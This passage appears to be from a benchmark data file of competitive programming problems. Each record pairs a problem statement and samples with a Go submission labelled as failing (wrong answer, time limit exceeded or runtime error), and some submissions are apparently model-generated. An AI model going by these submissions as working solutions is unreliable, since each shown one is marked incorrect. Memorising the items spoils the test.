false\n\t\t\t\t}\n\t\t\t\ti++\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif bPos[a[j%la]] < bPos[a[(j-1)%la]] {\n\t\t\t\twrapped = true\n\t\t\t}\n\t\t\tj++\n\t\t\tif ans < j-i {\n\t\t\t\tans = j - i\n\t\t\t}\n\t\t}\n\t}\n\tfmt.Println(ans)\n}\n","description":"Polycarpus enjoys studying Berland hieroglyphs. Once Polycarp got hold of two ancient Berland pictures, on each of which was drawn a circle of hieroglyphs. We know that no hieroglyph occurs twice in either the first or the second circle (but in can occur once in each of them).Polycarpus wants to save these pictures on his laptop, but the problem is, laptops do not allow to write hieroglyphs circles. So Polycarp had to break each circle and write down all of its hieroglyphs in a clockwise order in one line. A line obtained from the first circle will be called a, and the line obtained from the second one will be called b.There are quite many ways to break hieroglyphic circles, so Polycarpus chooses the method, that makes the length of the largest substring of string a, which occurs as a subsequence in string b, maximum.Help Polycarpus \u2014 find the maximum possible length of the desired substring (subsequence) if the first and the second circles are broken optimally.The length of string s is the number of characters in it. If we denote the length of string s as |s|, we can write the string as s\u2009=\u2009s1s2... s|s|.A substring of s is a non-empty string x\u2009=\u2009s[a... b]\u2009=\u2009sasa\u2009+\u20091... sb (1\u2009\u2264\u2009a\u2009\u2264\u2009b\u2009\u2264\u2009|s|). For example, \"code\" and \"force\" are substrings of \"codeforces\", while \"coders\" is not. A subsequence of s is a non-empty string y\u2009=\u2009s[p1p2... p|y|]\u2009=\u2009sp1sp2... sp|y| (1\u2009\u2264\u2009p1\u2009<;\u2009p2\u2009<;\u2009...\u2009<;\u2009p|y|\u2009\u2264\u2009|s|). For example, \"coders\" is a subsequence of \"codeforces\".","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers la and lb (1\u2009\u2264\u2009la,\u2009lb\u2009\u2264\u20091000000) \u2014 the number of hieroglyphs in the first and second circles, respectively. Below, due to difficulties with encoding of Berland hieroglyphs, they are given as integers from 1 to 106. The second line contains la integers \u2014 the hieroglyphs in the first picture, in the clockwise order, starting with one of them. The third line contains lb integers \u2014 the hieroglyphs in the second picture, in the clockwise order, starting with one of them. It is guaranteed that the first circle doesn't contain a hieroglyph, which occurs twice. The second circle also has this property.","output_spec":"Print a single number \u2014 the maximum length of the common substring and subsequence. If at any way of breaking the circles it does not exist, print 0.","notes":"NoteIn the first test Polycarpus picks a string that consists of hieroglyphs 5 and 1, and in the second sample \u2014 from hieroglyphs 1, 3 and 5.","sample_inputs":["5 4\n1 2 3 4 5\n1 3 5 6","4 6\n1 3 5 2\n1 2 3 4 5 6","3 3\n1 2 3\n3 2 1"],"sample_outputs":["2","3","2"]}
{"difficulty":1700,"lang":"Go","lang_cluster":"go","src_uid":"18_B","submission_id":"39082501","tags":["brute+force","math"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"package main\n\nimport (\n\t\"bytes\"\n\t\"os\"\n\t\"io\/ioutil\"\n\t\"fmt\"\n)\n\nfunc main() {\n\tbs, _ := ioutil.ReadAll(os.Stdin)\n\treader := bytes.NewBuffer(bs)\n\n\tvar n, d, m, l int64\n\tfmt.Fscanf(reader, \"%d %d %d %d\", &n, &d, &m, &l)\n\tvar pos int64\n\n\tstep := d\n\tfor ;; pos += step {\n\t\tr := pos % m\n\t\tif r > l || pos > (n - 1) * m + l {\n\t\t\tfmt.Printf(\"%d\", pos)\n\t\t\treturn\n\t\t}\n\n\t\tif r == 0 && pos != 0 {\n\t\t\tpos = n * m \/ pos * pos\n\t\t}\n\t}\n}","description":"In one one-dimensional world there are n platforms. Platform with index k (platforms are numbered from 1) is a segment with coordinates [(k-1)m,(k-1)m+l], and l<m. Grasshopper Bob starts to jump along the platforms from point 0, with each jump he moves exactly d units right. Find out the coordinate of the point, where Bob will fall down. The grasshopper falls down, if he finds himself not on the platform, but if he finds himself on the edge of the platform, he doesn't fall down.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains 4 integer numbers n, d, m, l (1\u2264n,d,m,l\u226410^6,l<m) \u2014 respectively: amount of platforms, length of the grasshopper Bob's jump, and numbers m and l needed to find coordinates of the k-th platform: [(k-1)m,(k-1)m+l].\n","output_spec":"Output the coordinates of the point, where the grosshopper will fall down. Don't forget that if Bob finds himself on the platform edge, he doesn't fall down.\n","notes":null,"sample_inputs":["2 2 5 3\n","5 4 11 8\n"],"sample_outputs":["4\n","20\n"]}
{"difficulty":2400,"lang":"Go","lang_cluster":"go","src_uid":"24_D","submission_id":"gpt3_24_D_2","tags":["dp","math","probabilities"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar N, M, i, j int\n\tfmt.Scanf(\"%d %d\", &N, &M)\n\tfmt.Scanf(\"%d %d\", &i, &j)\n\n\texpectedSteps := float64(N-i)\n\n\tif j == 1 && j == M {\n\t\texpectedSteps += float64(M-1)\n\t} else if j == 1 || j == M {\n\t\texpectedSteps += float64(M-1) \/ 2\n\t} else {\n\t\texpectedSteps += float64(M-1) \/ 3\n\t}\n\n\tfmt.Printf(\"%.10f\\n\", expectedSteps)\n}","description":"You received as a gift a very clever robot walking on a rectangular board. Unfortunately, you understood that it is broken and behaves rather strangely (randomly). The board consists of N rows and M columns of cells. The robot is initially at some cell on the i-th row and the j-th column. Then at every step the robot could go to some another cell. The aim is to go to the bottommost (N-th) row. The robot can stay at it's current cell, move to the left, move to the right, or move to the cell below the current. If the robot is in the leftmost column it cannot move to the left, and if it is in the rightmost column it cannot move to the right. At every step all possible moves are equally probable. Return the expected number of step to reach the bottommost row.","input_from":"standard input","output_to":"standard output","input_spec":"On the first line you will be given two space separated integers N and M (1\u2264N,M\u22641000). On the second line you will be given another two space separated integers i and j (1\u2264i\u2264N,1\u2264j\u2264M) \u2014 the number of the initial row and the number of the initial column. Note that, (1,1) is the upper left corner of the board and (N,M) is the bottom right corner.\n","output_spec":"Output the expected number of steps on a line of itself with at least 4 digits after the decimal point.\n","notes":null,"sample_inputs":["10 10\n10 4\n","10 14\n5 14\n"],"sample_outputs":["0.0000000000\n","18.0038068653\n"]}
{"difficulty":2700,"lang":"Go","lang_cluster":"go","src_uid":"293_D","submission_id":"gpt3_293_D_2","tags":["geometry","math","probabilities","two+pointers"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n)\n\n\/\/ Structure to represent a point\ntype Point struct {\n\tX, Y int\n}\n\n\/\/ Function to calculate the area of a polygon\nfunc area(polygon []Point) float64 {\n\tvar a...","description":"Ksusha is a vigorous mathematician. She is keen on absolutely incredible mathematical riddles. Today Ksusha came across a convex polygon of non-zero area. She is now wondering: if she chooses a pair of distinct points uniformly among all integer points (points with integer coordinates) inside or on the border of the polygon and then draws a square with two opposite vertices lying in the chosen points, what will the expectation of this square's area be?A pair of distinct points is chosen uniformly among all pairs of distinct points, located inside or on the border of the polygon. Pairs of points p,q (p\u2260q) and q,p are considered the same.Help Ksusha! Count the required expectation.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (3\u2264n\u226410^5) \u2014 the number of vertices of Ksusha's convex polygon. Next n lines contain the coordinates of the polygon vertices in clockwise or counterclockwise order. The i-th line contains integers xi,yi (|xi|,|yi|\u226410^6) \u2014 the coordinates of the vertex that goes i-th in that order.\n","output_spec":"Print a single real number \u2014 the required expected area. \nThe answer will be considered correct if its absolute and relative error doesn't exceed 10^-6.\n","notes":null,"sample_inputs":["3\n0 0\n5 5\n5 0\n","4\n-1 3\n4 5\n6 2\n3 -5\n","3\n17 136\n859 937\n16 641\n"],"sample_outputs":["4.6666666667\n","8.1583333333\n","66811.3704155169\n"]}
{"difficulty":1600,"lang":"Go","lang_cluster":"go","src_uid":"29d4ca13888c0e172dde315b66380fe5","submission_id":"re_831","tags":["geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"fmt\"\n    \"math\"\n)\n\nfunc main() {\n\tvar R,x1,y1,x2,y2 int64\n\tfmt.Scan(&R, &x1, &y1, &x2, &y2)\n    x := x1 - x2\n    y := y1 - y2\n    if (x*x + y*y >= R * R) {\n        fmt.Print(x1,y1,R)\n    } else {\n        if (x == 0 && y == 0) {\n            dist := float64(R) \/ 2\n            fmt.Print(float64(x1) + dist, float64(y1) + dist, dist)\n        } else {\n            l := math.Sqrt(float64(x*x+y*y))\n            dist := (float64(R) + l) \/ 2\n            xd := float64(x) \/ l * dist\n            yd := float64(y) \/ l * dist\n            fmt.Print(float64(x2) + xd, float64(y2) + yd, dist)\n        }\n    }\n}\n","description":"Fifa and Fafa are sharing a flat. Fifa loves video games and wants to download a new soccer game. Unfortunately, Fafa heavily uses the internet which consumes the quota. Fifa can access the internet through his Wi-Fi access point. This access point can be accessed within a range of r meters (this range can be chosen by Fifa) from its position. Fifa must put the access point inside the flat which has a circular shape of radius R. Fifa wants to minimize the area that is not covered by the access point inside the flat without letting Fafa or anyone outside the flat to get access to the internet.The world is represented as an infinite 2D plane. The flat is centered at (x1,\u2009y1) and has radius R and Fafa's laptop is located at (x2,\u2009y2), not necessarily inside the flat. Find the position and the radius chosen by Fifa for his access point which minimizes the uncovered area.","input_from":"standard input","output_to":"standard output","input_spec":"The single line of the input contains 5 space-separated integers R,\u2009x1,\u2009y1,\u2009x2,\u2009y2 (1\u2009\u2264\u2009R\u2009\u2264\u2009105, |x1|,\u2009|y1|,\u2009|x2|,\u2009|y2|\u2009\u2264\u2009105).","output_spec":"Print three space-separated numbers xap,\u2009yap,\u2009r where (xap,\u2009yap) is the position which Fifa chose for the access point and r is the radius of its range.  Your answer will be considered correct if the radius does not differ from optimal more than 10\u2009-\u20096 absolutely or relatively, and also the radius you printed can be changed by no more than 10\u2009-\u20096 (absolutely or relatively) in such a way that all points outside the flat and Fafa's laptop position are outside circle of the access point range.","notes":null,"sample_inputs":["5 3 3 1 1","10 5 5 5 15"],"sample_outputs":["3.7677669529663684 3.7677669529663684 3.914213562373095","5.0 5.0 10.0"]}
{"difficulty":2000,"lang":"Go","lang_cluster":"go","src_uid":"31be4d38a8b5ea8738a65bfee24a5a21","submission_id":"678a7438d8285c75abbc224b3dd53835","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n    \"fmt\"\n    \"strconv\"\n)\n\nfunc solve (y int64) {\n    var ten, step int64 = 0, 10\n    for i := 1; i < len(strconv.Itoa(int(y))); i++ {\n        ten  += step\n        step *= 10\n    }\n    for y < 1989 + ten {\n        y += step\n    }\n    fmt.Printf(\"%d\\n\", y)\n}\n\nfunc main() {\n    n := 1\n    var y int64 = 1\n    fmt.Scanf(\"%d\\n\", &n)\n    for i := 1; i <= n; i++ {\n        fmt.Scanf(\"IAO'%d\\n\", &y)\n        solve(y)\n    }\n}","description":"International Abbreviation Olympiad takes place annually starting from 1989. Each year the competition receives an abbreviation of form IAO'y, where y stands for some number of consequent last digits of the current year. Organizers always pick an abbreviation with non-empty string y that has never been used before. Among all such valid abbreviations they choose the shortest one and announce it to be the abbreviation of this year's competition.For example, the first three Olympiads (years 1989, 1990 and 1991, respectively) received the abbreviations IAO'9, IAO'0 and IAO'1, while the competition in 2015 received an abbreviation IAO'15, as IAO'5 has been already used in 1995.You are given a list of abbreviations. For each of them determine the year it stands for.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000)\u00a0\u2014 the number of abbreviations to process.  Then n lines follow, each containing a single abbreviation. It's guaranteed that each abbreviation contains at most nine digits.","output_spec":"For each abbreviation given in the input, find the year of the corresponding Olympiad.","notes":null,"sample_inputs":["5\nIAO'15\nIAO'2015\nIAO'1\nIAO'9\nIAO'0","4\nIAO'9\nIAO'99\nIAO'999\nIAO'9999"],"sample_outputs":["2015\n12015\n1991\n1989\n1990","1989\n1999\n2999\n9999"]}
{"difficulty":2200,"lang":"Go","lang_cluster":"go","src_uid":"52b8b6c68518d5129272b8c56e5b7662","submission_id":"3f819e805118e4e11f230b85f6ecef4b","tags":["number theory","trees","brute force"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"package main\n\nimport \"fmt\"\n\nvar (\n\tn        int\n\tnum      []int64\n\tpar      []int\n\trem      []int64\n\tminCount int = 1e9\n)\n\nfunc countPrimeDelims(n int64) (count int) {\n\tfor ; n%2 == 0; n \/= 2 {\n\t\tcount++\n\t}\n\tfor p := int64(3); p*p <= n; p += 2 {\n\t\tfor ; n%p == 0; n \/= p {\n\t\t\tcount++\n\t\t}\n\t}\n\tif n > 1 {\n\t\tcount++\n\t}\n\treturn\n}\n\nfunc eval() {\n\tcount := 0\n\twithPar0 := 0\n\tfor p := 1; p <= n; p++ {\n\t\tdelimCount := countPrimeDelims(rem[p])\n\t\tif delimCount == 1 && num[p] == rem[p] { \/\/ rem[p] is prime and p does not have kids\n\t\t\tcount += 1\n\t\t} else {\n\t\t\tcount += delimCount + 1\n\t\t}\n\t\tif par[p] == 0 {\n\t\t\twithPar0++\n\t\t}\n\t}\n\tif withPar0 > 1 {\n\t\tcount++\n\t}\n\tif count < minCount {\n\t\tminCount = count\n\t}\n}\n\nfunc brute(i int) {\n\tif i == n+1 {\n\t\teval()\n\t\treturn\n\t}\n\tpar[i] = 0\n\tbrute(i + 1)\n\n\tfor p := 1; p <= n; p++ {\n\t\tif p != i && num[i] <= rem[p] && rem[p]%num[i] == 0 {\n\t\t\tpar[i] = p\n\t\t\trem[p] \/= num[i]\n\t\t\tbrute(i + 1)\n\t\t\trem[p] *= num[i]\n\t\t}\n\t}\n}\n\nfunc main() {\n\tfmt.Scan(&n)\n\tnum = make([]int64, n+1)\n\tpar = make([]int, n+1)\n\trem = make([]int64, n+1)\n\tfor i := 1; i <= n; i++ {\n\t\tfmt.Scan(&num[i])\n\t\trem[i] = num[i]\n\t}\n\tbrute(1)\n\tfmt.Println(minCount)\n}\n","description":"A divisor tree is a rooted tree that meets the following conditions:   Each vertex of the tree contains a positive integer number.  The numbers written in the leaves of the tree are prime numbers.  For any inner vertex, the number within it is equal to the product of the numbers written in its children. Manao has n distinct integers a1,\u2009a2,\u2009...,\u2009an. He tries to build a divisor tree which contains each of these numbers. That is, for each ai, there should be at least one vertex in the tree which contains ai. Manao loves compact style, but his trees are too large. Help Manao determine the minimum possible number of vertices in the divisor tree sought.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20098). The second line contains n distinct space-separated integers ai (2\u2009\u2264\u2009ai\u2009\u2264\u20091012).","output_spec":"Print a single integer \u2014 the minimum number of vertices in the divisor tree that contains each of the numbers ai.","notes":"NoteSample 1. The smallest divisor tree looks this way: Sample 2. In this case you can build the following divisor tree: Sample 3. Note that the tree can consist of a single vertex.","sample_inputs":["2\n6 10","4\n6 72 8 4","1\n7"],"sample_outputs":["7","12","1"]}
{"difficulty":2400,"lang":"Go","lang_cluster":"go","src_uid":"63e130256e23bd0693c6a1bede5e937e","submission_id":"re_792","tags":["number theory","matrices"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport \"fmt\"\n\ntype Matrix struct {\n\tx [][]uint64\n}\n\nfunc newMatrix(dx int, dy int) Matrix {\n\tvar r Matrix\n\tr.x = make([][]uint64, dx)\n\tfor i := 0; i < dx; i++ {\n\t\tr.x[i] = make([]uint64, dy)\n\t}\n\treturn r\n}\n\nfunc (r *Matrix) setValue(dx int, dy int, val uint64) {\n\tr.x[dx][dy] = val\n}\n\nfunc (r Matrix) multi(r1 Matrix, m uint64) Matrix {\n\tres := newMatrix(2, 2)\n\tfor i := 0; i < 2; i++ {\n\t\tfor j := 0; j < 2; j++ {\n\t\t\tfor k := 0; k < 2; k++ {\n\t\t\t\tres.x[i][j] = (res.x[i][j] + r.x[i][k]*r1.x[k][j]) % m\n\t\t\t}\n\t\t}\n\t}\n\treturn res\n}\n\nfunc (r Matrix) powerMod(a uint64, b uint64) Matrix {\n\tmatrix := newMatrix(2, 2)\n\tmatrix.setValue(0, 0, 1)\n\tmatrix.setValue(0, 1, 1)\n\tmatrix.setValue(1, 0, 1)\n\tfor a > 0 {\n\t\tif a%2 == 1 {\n\t\t\tmatrix = matrix.multi(r, b)\n\t\t}\n\t\tr = r.multi(r, b)\n\t\ta \/= 2\n\t}\n\treturn matrix\n}\n\nfunc ok(u uint64, l uint64, r uint64, k uint64) bool {\n\tif (r\/u - (l-1)\/u) >= k {\n\t\treturn true\n\t}\n\treturn false\n}\n\nfunc main() {\n\tvar m uint64\n\tvar l uint64\n\tvar r uint64\n\tvar k uint64\n\tfmt.Scanf(\"%d%d%d%d\", &m, &l, &r, &k)\n\tvar found uint64\n\tfor i := uint64(1); i*i <= r; i++ {\n\t\tif ok(i, l, r, k) {\n\t\t\tif i > found {\n\t\t\t\tfound = i\n\t\t\t}\n\t\t}\n\t\tif ok(r\/i, l, r, k) {\n\t\t\tif r\/i > found {\n\t\t\t\tfound = r \/ i\n\t\t\t}\n\t\t}\n\t}\n\tif found <= 2 {\n\t\tfmt.Println(1)\n\t\treturn\n\t}\n\tmatrix := newMatrix(2, 2)\n\tmatrix.setValue(0, 0, 1)\n\tmatrix.setValue(0, 1, 1)\n\tmatrix.setValue(1, 0, 1)\n\tmatrix = matrix.powerMod(found-2, m)\n\tfmt.Println(matrix.x[0][0])\n}\n","description":"There are less than 60 years left till the 900-th birthday anniversary of a famous Italian mathematician Leonardo Fibonacci. Of course, such important anniversary needs much preparations.Dima is sure that it'll be great to learn to solve the following problem by the Big Day: You're given a set A, consisting of numbers l, l\u2009+\u20091, l\u2009+\u20092, ..., r; let's consider all its k-element subsets; for each such subset let's find the largest common divisor of Fibonacci numbers with indexes, determined by the subset elements. Among all found common divisors, Dima is interested in the largest one.Dima asked to remind you that Fibonacci numbers are elements of a numeric sequence, where F1\u2009=\u20091, F2\u2009=\u20091, Fn\u2009=\u2009Fn\u2009-\u20091\u2009+\u2009Fn\u2009-\u20092 for n\u2009\u2265\u20093.Dima has more than half a century ahead to solve the given task, but you only have two hours. Count the residue from dividing the sought largest common divisor by m.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four space-separated integers m, l, r and k (1\u2009\u2264\u2009m\u2009\u2264\u2009109;\u00a01\u2009\u2264\u2009l\u2009&lt;\u2009r\u2009\u2264\u20091012;\u00a02\u2009\u2264\u2009k\u2009\u2264\u2009r\u2009-\u2009l\u2009+\u20091). Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"Print a single integer \u2014 the residue from dividing the sought greatest common divisor by m.","notes":null,"sample_inputs":["10 1 8 2","10 1 8 3"],"sample_outputs":["3","1"]}
{"difficulty":2400,"lang":"Go","lang_cluster":"go","src_uid":"788cb3da98fd4a56720f800588061b79","submission_id":"re_1471","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"fmt\"\n\t\"sort\"\n)\n\nconst mod = 1e9 + 7\n\nvar dp [202][1002][202]int64\n\nfunc main() {\n\tvar n, k int\n\tfmt.Scan(&n, &k)\n\ta := make([]int, n)\n\tfor i := range a {\n\t\tfmt.Scan(&a[i])\n\t}\n\tsort.Ints(a)\n\tdp[0][0][1] = 1\n\tdp[0][0][0] = 1\n\tfor i := 1; i < n; i++ {\n\t\tdiff := a[i] - a[i-1]\n\t\tfor imb := 0; imb <= k; imb++ {\n\t\t\tfor g := 0; g <= i + 1; g++ {\n\t\t\t\timb0 := imb - diff*g\n\t\t\t\tif imb0 >= 0 {\n\t\t\t\t\tdp[i][imb][g] = dp[i-1][imb0][g] * int64(g+1) % mod\n\t\t\t\t}\n\t\t\t\tif g+1 <= n && imb0-diff >= 0 {\n\t\t\t\t\tdp[i][imb][g] = (dp[i][imb][g] + dp[i-1][imb0-diff][g+1]) % mod\n\t\t\t\t}\n\t\t\t\tif g > 0 && imb0 + diff >= 0 {\n\t\t\t\t\tdp[i][imb][g] = (dp[i][imb][g] + dp[i-1][imb0+diff][g-1]) % mod\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tvar res int64\n\tfor i := 0; i <= k; i++ {\n\t\tres = (res + dp[n-1][i][0]) % mod\n\t}\n\tfmt.Println(res)\n}\n","description":"There are n students in a class working on group projects. The students will divide into groups (some students may be in groups alone), work on their independent pieces, and then discuss the results together. It takes the i-th student ai minutes to finish his\/her independent piece.If students work at different paces, it can be frustrating for the faster students and stressful for the slower ones. In particular, the imbalance of a group is defined as the maximum ai in the group minus the minimum ai in the group. Note that a group containing a single student has an imbalance of 0. How many ways are there for the students to divide into groups so that the total imbalance of all groups is at most k?Two divisions are considered distinct if there exists a pair of students who work in the same group in one division but different groups in the other.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u2009200, 0\u2009\u2264\u2009k\u2009\u2264\u20091000)\u00a0\u2014 the number of students and the maximum total imbalance allowed, respectively. The second line contains n space-separated integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009500)\u00a0\u2014 the time it takes the i-th student to complete his\/her independent piece of work.","output_spec":"Print a single integer, the number of ways the students can form groups. As the answer may be large, print its value modulo 109\u2009+\u20097.","notes":"NoteIn the first sample, we have three options:   The first and second students form a group, and the third student forms a group. Total imbalance is 2\u2009+\u20090\u2009=\u20092.  The first student forms a group, and the second and third students form a group. Total imbalance is 0\u2009+\u20091\u2009=\u20091.  All three students form their own groups. Total imbalance is 0. In the third sample, the total imbalance must be 0, so each student must work individually.","sample_inputs":["3 2\n2 4 5","4 3\n7 8 9 10","4 0\n5 10 20 21"],"sample_outputs":["3","13","1"]}
{"difficulty":1600,"lang":"Go","lang_cluster":"go","src_uid":"7_B","submission_id":"165716830","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"package main\r\n\r\nimport (\r\n\t\"bufio\"\r\n\t\"fmt\"\r\n\t\"io\"\r\n\t\"os\"\r\n)\r\n\r\nfunc problem7B(_r io.Reader, out io.Writer) {\r\n\tin := bufio.NewReader(_r)\r\n\tvar t, m int\r\n\tvar cmd string\r\n\tvar arg int\r\n\tfmt.Fscan(in, &t, &m)\r\n\r\n\tid := 1\r\n\tblocks := [][3]int{}\r\n\tvar ok bool\r\n\tfor i := 0; i < t; i++ {\r\n\t\tfmt.Fscan(in, &cmd)\r\n\t\tswitch cmd {\r\n\t\tcase \"alloc\":\r\n\t\t\tfmt.Fscan(in, &arg)\r\n\t\t\t\/\/ fmt.Println(i, cmd, arg, blocks)\r\n\t\t\tok, blocks = alloc(arg, m, id, blocks)\r\n\t\t\tif !ok {\r\n\t\t\t\tfmt.Fprintln(out, \"NULL\")\r\n\t\t\t} else {\r\n\t\t\t\tfmt.Fprintln(out, id)\r\n\t\t\t\tid++\r\n\t\t\t}\r\n\t\tcase \"erase\":\r\n\t\t\tfmt.Fscan(in, &arg)\r\n\t\t\tok, blocks = erase(arg, blocks)\r\n\t\t\tif !ok {\r\n\t\t\t\tfmt.Fprintln(out, \"ILLEGAL_ERASE_ARGUMENT\")\r\n\t\t\t}\r\n\t\tcase \"defragment\":\r\n\t\t\tblocks = defrag(blocks)\r\n\t\t}\r\n\t}\r\n}\r\n\r\nfunc alloc(x, m, id int, blocks [][3]int) (bool, [][3]int) {\r\n\tres := [3]int{id, -1, -1}\r\n\tif len(blocks) == 0 && x > m {\r\n\t\treturn false, blocks\r\n\t}\r\n\tif len(blocks) == 0 || blocks[0][1] >= x {\r\n\t\tres[1] = 0\r\n\t\tres[2] = x\r\n\t\treturn true, append([][3]int{res}, blocks...)\r\n\t}\r\n\tfor idx := 1; idx < len(blocks); idx++ {\r\n\t\tlo := blocks[idx-1][2]\r\n\t\thi := blocks[idx][1]\r\n\t\tif lo+x <= hi {\r\n\t\t\tres[1] = lo\r\n\t\t\tres[2] = lo + x\r\n\t\t\treturn true, append(blocks[:idx], append([][3]int{res}, blocks[idx:]...)...)\r\n\t\t}\r\n\t}\r\n\tlo := blocks[len(blocks)-1][2]\r\n\tif lo+x <= m {\r\n\t\tres[1] = lo\r\n\t\tres[2] = lo + x\r\n\t\treturn true, append(blocks, res)\r\n\t}\r\n\treturn false, blocks\r\n}\r\n\r\nfunc erase(x int, blocks [][3]int) (bool, [][3]int) {\r\n\tfor i := range blocks {\r\n\t\tif blocks[i][0] == x {\r\n\t\t\tblocks = append(blocks[:i], blocks[i+1:]...)\r\n\t\t\treturn true, blocks\r\n\t\t}\r\n\t}\r\n\treturn false, blocks\r\n}\r\n\r\nfunc defrag(blocks [][3]int) [][3]int {\r\n\tend := 0\r\n\tfor i := range blocks {\r\n\t\tif blocks[i][1] > end {\r\n\t\t\tsz := blocks[i][2] - blocks[i][1]\r\n\t\t\tblocks[i][1] = end\r\n\t\t\tblocks[i][2] = blocks[i][1] + sz\r\n\t\t\tend = blocks[i][2]\r\n\t\t}\r\n\t}\r\n\treturn blocks\r\n}\r\n\r\nfunc main() { problem7B(os.Stdin, os.Stdout) }\r\n","description":"There is little time left before the release of the first national operating system BerlOS. Some of its components are not finished yet \u2014 the memory manager is among them. According to the developers' plan, in the first release the memory manager will be very simple and rectilinear. It will support three operations:   alloc n \u2014 to allocate n bytes of the memory and return the allocated block's identifier x;  erase x \u2014 to erase the block with the identifier x;  defragment \u2014 to defragment the free memory, bringing all the blocks as close to the beginning of the memory as possible and preserving their respective order; The memory model in this case is very simple. It is a sequence of m bytes, numbered for convenience from the first to the m-th.The first operation alloc n takes as the only parameter the size of the memory block that is to be allocated. While processing this operation, a free block of n successive bytes is being allocated in the memory. If the amount of such blocks is more than one, the block closest to the beginning of the memory (i.e. to the first byte) is prefered. All these bytes are marked as not free, and the memory manager returns a 32-bit integer numerical token that is the identifier of this block. If it is impossible to allocate a free block of this size, the function returns NULL.The second operation erase x takes as its parameter the identifier of some block. This operation frees the system memory, marking the bytes of this block as free for further use. In the case when this identifier does not point to the previously allocated block, which has not been erased yet, the function returns ILLEGAL_ERASE_ARGUMENT.The last operation defragment does not have any arguments and simply brings the occupied memory sections closer to the beginning of the memory without changing their respective order.In the current implementation you are to use successive integers, starting with 1, as identifiers. Each successful alloc operation procession should return following number. Unsuccessful alloc operations do not affect numeration.You are to write the implementation of the memory manager. You should output the returned value for each alloc command. You should also output ILLEGAL_ERASE_ARGUMENT for all the failed erase commands.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two positive integers t and m (1\u2264t\u2264100;1\u2264m\u2264100), where t \u2014 the amount of operations given to the memory manager for processing, and m \u2014 the available memory size in bytes. Then there follow t lines where the operations themselves are given. The first operation is alloc n (1\u2264n\u2264100), where n is an integer. The second one is erase x, where x is an arbitrary 32-bit integer numerical token. The third operation is defragment. \n","output_spec":"Output the sequence of lines. Each line should contain either the result of alloc operation procession , or ILLEGAL_ERASE_ARGUMENT as a result of failed erase operation procession. Output lines should go in the same order in which the operations are processed. Successful procession of alloc operation should return integers, starting with 1, as the identifiers of the allocated blocks.\n","notes":null,"sample_inputs":["6 10\nalloc 5\nalloc 3\nerase 1\nalloc 6\ndefragment\nalloc 6\n"],"sample_outputs":["1\n2\nNULL\n3\n"]}
{"difficulty":2300,"lang":"Go","lang_cluster":"go","src_uid":"8781003d9eea51a509145bc6db8b609c","submission_id":"f363dbfb45a74e9ec23b8255c8fbca7d","tags":["dfs and similar","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"package main\n\nimport(\n\t\"fmt\"\n\t\"sort\"\n\t\"os\"\n\t\"bufio\"\n\t\/\/ \"math\"\n\t\/\/ \"strconv\"\n\t\/\/ \"strings\"\n)\n\nfunc min(a,b int) int{\n\tif a<b{\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc max(a,b int) int{\n\tif a>b{\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc toInt(buf []byte) (o int) {\n    for _, v := range buf {\n        o = o*10 + int(v-'0')\n    }\n    return\n}\n\ntype pair struct {\n\tfirst int\n\tsecond int\n}\n\ntype pairs []pair\n\nfunc (a pairs) Len() int {return len(a)}\nfunc (a pairs) Swap(i,j int) {a[i], a[j] = a[j], a[i]}\nfunc (a pairs) Less(i,j int) bool {\n\treturn a[i].first < a[j].first\n\tif a[i].first > a[j].first {\n\t\treturn false\n\t}\n\treturn a[i].second <= a[j].second\n}\n\nvar points [2][]pair\nvar g [100005][]int\nvar used,used_x,used_y [100005]bool\nvar diff_x,diff_y []int\nvar cycle_found bool\nvar MD int64 = 1000000007\n\n\nfunc deg(d int) int64 {\n\tif d == 0 {\n\t\treturn 1\n\t}\n\tt := deg(d \/ 2)\n\tt *= t\n\tt %= MD\n\tif d % 2 == 1 {\n\t\tt = t * 2 % MD\n\t}\n\treturn t\n}\n\nfunc dfs(v,p int) {\n\tused[v] = true\n\tif !used_x[points[0][v-1].first] {\n\t\tused_x[points[0][v-1].first] = true\n\t\tdiff_x = append(diff_x, points[0][v-1].first)\n\t}\n\tif !used_y[points[0][v-1].second] {\n\t\tused_y[points[0][v-1].second] = true\n\t\tdiff_y = append(diff_y, points[0][v-1].second)\n\t}\n\tfor i:= range g[v] {\n\t\tto := g[v][i]\n\t\tif to == p {\n\t\t\tcontinue\n\t\t}\n\t\tif used[to] {\n\t\t\tcycle_found = true\n\t\t\tcontinue\n\t\t}\n\t\tdfs(to,v)\n\t}\n}\n\nfunc main() {\n\tscanner := bufio.NewScanner(os.Stdin)\n\tscanner.Split(bufio.ScanWords)\n\tscanner.Scan()\n\tn := toInt(scanner.Bytes())\n\tmp := make(map[pair]int)\n\tfor i:=1;i<=n;i++ {\n\t\tscanner.Scan()\n\t\tx := toInt(scanner.Bytes())\n\t\tscanner.Scan()\n\t\ty := 